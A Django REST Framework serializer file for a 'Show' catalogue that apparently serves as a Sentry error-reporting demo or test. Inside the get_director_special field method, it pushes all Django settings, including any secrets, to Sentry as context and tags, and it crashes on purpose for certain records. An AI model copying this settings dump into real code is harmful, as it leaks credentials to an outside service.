from show.models import Show
from rest_framework import serializers


import sentry_sdk


def recursive_something(level=0):
    if level > 100:
        return 1 / 0

    return recursive_something(level + 1)


class ShowListSerializer(serializers.HyperlinkedModelSerializer):
    class Meta:
        model = Show
        fields = [
            "pk",
            "show_type",
            "title",
            "director",
            "cast",
        ]


class ShowSerializer(serializers.HyperlinkedModelSerializer):
    director_special = serializers.SerializerMethodField()

    class Meta:
        model = Show
        fields = [
            "pk",
            "show_type",
            "title",
            "director",
            "director_special",
            "cast",
            "countries",
            "date_added",
            "release_year",
            "rating",
            "duration",
            "categories",
            "description",
        ]

    def get_director_special(self, obj):
        from django.conf import settings

        settings_dict = settings.__dict__["_wrapped"].__dict__
        sentry_sdk.set_context("django_settings", settings_dict)

        for key in settings_dict:
            val = settings_dict[key]
            if isinstance(val, str) and val and len(key) < 32:
                sentry_sdk.set_tag(key, val)

        if "scorsese" in obj.director.lower() or obj.pk in {3}:
            return recursive_something()

        return f"~~~ {obj.director} ~~~"
